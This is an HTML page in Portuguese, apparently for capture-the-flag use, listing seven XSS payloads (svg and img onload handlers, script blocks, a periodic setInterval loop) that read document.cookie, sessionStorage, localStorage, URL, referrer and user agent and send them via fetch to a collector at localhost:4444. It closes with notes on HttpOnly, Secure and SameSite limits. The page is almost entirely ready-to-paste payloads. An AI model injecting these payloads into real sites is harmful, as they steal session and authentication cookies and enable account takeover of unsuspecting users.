<!DOCTYPE html>
<html>
<head>
    <title>XSS - Capturando TODOS os Cookies</title>
</head>
<body>

<h2>Payloads XSS para capturar TODOS os cookies do navegador</h2>

<h3>ğŸª MÃ©todo 1: document.cookie (cookies do domÃ­nio atual)</h3>
<p><strong>Captura:</strong> Todos os cookies do domÃ­nio atual que sÃ£o acessÃ­veis via JavaScript</p>
<textarea rows="1" cols="100">
<svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}`)"></svg>
</textarea>

<h3>ğŸª MÃ©todo 2: Iterando por todos os cookies manualmente</h3>
<p><strong>Captura:</strong> Parse individual de cada cookie</p>
<textarea rows="5" cols="100">
<script>
const cookies = document.cookie.split(';').map(c => c.trim());
const allCookies = cookies.join('|');
fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(allCookies)}`);
</script>
</textarea>

<h3>ğŸª MÃ©todo 3: Cookies + SessionStorage + LocalStorage</h3>
<p><strong>Captura:</strong> Cookies + dados de storage do navegador</p>
<textarea rows="8" cols="100">
<script>
const data = {
  cookies: document.cookie,
  sessionStorage: JSON.stringify(sessionStorage),
  localStorage: JSON.stringify(localStorage)
};
fetch(`http://localhost:4444/debug-cookie?data=${encodeURIComponent(JSON.stringify(data))}`);
</script>
</textarea>

<h3>ğŸª MÃ©todo 4: FunÃ§Ã£o completa de extraÃ§Ã£o</h3>
<p><strong>Captura:</strong> Todos os cookies formatados individualmente</p>
<textarea rows="10" cols="100">
<script>
function getAllCookies() {
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.split('=').map(c => c.trim());
    if (name) cookies[name] = value || '';
  });
  return cookies;
}
const allCookies = getAllCookies();
fetch(`http://localhost:4444/debug-cookie?cookies=${encodeURIComponent(JSON.stringify(allCookies))}`);
</script>
</textarea>

<h3>ğŸª MÃ©todo 5: SVG onload com mÃºltiplos dados</h3>
<p><strong>Captura:</strong> Cookies + informaÃ§Ãµes do navegador</p>
<textarea rows="1" cols="100">
<svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(location.href)}&ua=${encodeURIComponent(navigator.userAgent)}`)"></svg>
</textarea>

<h3>ğŸª MÃ©todo 6: IMG onload com dados completos</h3>
<p><strong>Captura:</strong> MÃ¡xima informaÃ§Ã£o possÃ­vel</p>
<textarea rows="6" cols="100">
<img src=x onload="
const info = {
  cookies: document.cookie,
  url: location.href,
  referrer: document.referrer,
  userAgent: navigator.userAgent
};
fetch('http://localhost:4444/debug-cookie?data=' + encodeURIComponent(JSON.stringify(info)));
">
</textarea>

<h3>ğŸª MÃ©todo 7: Captura periÃ³dica (para cookies que mudam)</h3>
<p><strong>Captura:</strong> Cookies a cada 5 segundos</p>
<textarea rows="4" cols="100">
<script>
setInterval(() => {
  fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}&time=${Date.now()}`);
}, 5000);
</script>
</textarea>

<hr>

<h3>ğŸ” Tipos de cookies que sÃ£o capturados:</h3>
<ul>
    <li>âœ… <strong>Cookies de sessÃ£o:</strong> sessionid, auth_token, etc.</li>
    <li>âœ… <strong>Cookies de autenticaÃ§Ã£o:</strong> login cookies, JWT tokens em cookies</li>
    <li>âœ… <strong>Cookies de preferÃªncias:</strong> idioma, tema, configuraÃ§Ãµes</li>
    <li>âœ… <strong>Cookies de tracking:</strong> analytics, advertising IDs</li>
    <li>âŒ <strong>HttpOnly cookies:</strong> NÃƒO sÃ£o acessÃ­veis via JavaScript (por seguranÃ§a)</li>
    <li>âŒ <strong>Cookies de outros domÃ­nios:</strong> Same-origin policy impede acesso</li>
</ul>

<h3>âš ï¸ LimitaÃ§Ãµes importantes:</h3>
<ul>
    <li><strong>HttpOnly:</strong> Cookies marcados como HttpOnly nÃ£o aparecem em document.cookie</li>
    <li><strong>Secure:</strong> Cookies Secure sÃ³ funcionam em HTTPS</li>
    <li><strong>SameSite:</strong> PolÃ­ticas SameSite podem limitar acesso</li>
    <li><strong>Domain:</strong> SÃ³ acessa cookies do domÃ­nio atual e subdomÃ­nios</li>
</ul>

<h3>ğŸ¯ Para CTF - MÃ©todo mais eficaz:</h3>
<p><strong>Use o MÃ©todo 1 (mais simples):</strong></p>
<code>&lt;svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}`)"&gt;&lt;/svg&gt;</code>

<p><strong>Para captura mais detalhada, use o MÃ©todo 4:</strong></p>
<p>Ele organiza os cookies em um objeto JSON, facilitando a anÃ¡lise.</p>

</body>
</html>